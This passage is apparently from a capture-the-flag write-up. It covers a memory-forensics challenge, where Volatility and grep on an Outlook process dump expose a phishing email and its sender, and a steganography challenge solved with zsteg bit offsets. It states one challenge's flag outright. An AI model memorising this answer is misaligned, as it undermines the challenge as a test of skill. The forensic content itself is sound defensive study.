Now that all the outlook process memory was in 1 file I wanted to move on to see if
the capture had any .pst or .ost files in it. With these files, I might be able to get
a look at some full emails.

[![Filescan](/assets/pbjar/robot4.png)](/assets/pbjar/robot4.png)
<figcaption align=center><b>Figure 19-4: Volatility - Searching Scanfiles Output for Outlook Files</b></figcaption>
&nbsp;

Combining the filescan plugin with a grep printed out some useful information. There is
a trio of potential .ost files. The ost file paths also reveal an account on the machine,
FrontDesk. Next, dumping the ost data.

[![File dump](/assets/pbjar/robot5.png)](/assets/pbjar/robot5.png)
<figcaption align=center><b>Figure 19-5: Volatility - Dumping .ost File Data</b></figcaption>
&nbsp;

Unfortunately, like in **Figure 19-5**, none of the .ost files had much data in them, definitely
not enough to work with. I then moved back a few steps to the outlook process dump.
I started by trying to extract some email addresses from the process dump.

[![grep emails](/assets/pbjar/robots6.png)](/assets/pbjar/robots6.png)
<figcaption align=center><b>Figure 19-6: Extracting Email Addresses from 3196.dmp</b></figcaption>
&nbsp;

I managed to grep a bunch of email addresses from the file, a few of which were a bit mangled.
Looking through the list I noticed one fairly conspicuous email: th3wh1t3r0s3@gmail.com.
The rest of the emails were fairly normal-looking so I decided to investigate the white rose
first.

[![white rose](/assets/pbjar/robot_mayb_needed.png)](/assets/pbjar/robot_mayb_needed.png)
<figcaption align=center><b>Figure 19-7: Grep Command for "th3wh1t3r0s3@gmail.com"</b></figcaption>
&nbsp;

Issuing a grep for the email shows a few results, most importantly, a "From: Th3 Wh1t3R0s3" tag.
There is an email from Th3 Wh1t3R0s3 in memory but the contents aren't available from this view.
To investigate further I examined the process dump starting at the line where the "From" tag
appears.

[![Tail command](/assets/pbjar/robot8.png)](/assets/pbjar/robot8.png)
<figcaption align=center><b>Figure 19-8: Tail Command for Specific Line in File</b></figcaption>
&nbsp;

A few lines following the From tag there is the "To:" tag which shows that frontdesk is the direct
recipient of this email. However, still no readable email body. I figured with a bit more work,
we might be able to figure out the contents of this email.

[![Grep hello](/assets/pbjar/robot10.png)](/assets/pbjar/robot10.png)
<figcaption align=center><b>Figure 19-9: Grep Command for "hello"</b></figcaption>
&nbsp;

Grepping for "hello" reveals a single email body with a few curious details. The email is targeted
at a Mr. Wellick with the headline "VPN Update". The email also offers a link to some software named
AnyConnectInstaller. The message ends with a send-off from "AllSafe IT Support Desk" which directly
correlates to the frontdesk@allsafecybersec.com email address we found earlier.

Given the lack of other emails or correspondence, it seemed like a good bet that this was either
the phishing email or a response to it. The final line of the email points to this being
connected to the "From" and "To" tags we saw earlier. If this is the case, then Th3_Wh1t3R0s3
is the phisher. This means Th3_Wh1t3R0s3 should be the flag. Submitting this flag resulted in a
victory and the challenge was complete.

<figcaption align=center><b>Figure 20-1: Given Challenge Image</b></figcaption>

I tried a few tools before finally hitting some interesting results with zsteg. The
results of zsteg reveal one of the hints the description was hinting at. The hint states
that the flag is hidden in the LSBs of the image but it has an offset. Fortunately,
unlike what the hint says, zsteg can provide an offset.

[![Zsteg shifted](/assets/pbjar/secret2.png)](/assets/pbjar/secret2.png)
<figcaption align=center><b>Figure 20-3: Zsteg Tool Output With Shift of 2</b></figcaption>
&nbsp;

I decided to start with a shift of 2 and the results were very hopeful. **Figure 20-3** shows
that zsteg was able to find a large portion of the flag written backward. Next, I
attempted a few brute-force attempts on the shift to see if I could get more of the
flag printed.

[![Zsteg shift 6](/assets/pbjar/secret3.png)](/assets/pbjar/secret3.png)
<figcaption align=center><b>Figure 20-4: Zsteg Tool Output With Shift of 6</b></figcaption>

A shift of 6 ended up providing the next important result. The shift was just
the right amount to print out the flag that was hiding in the LSBs.
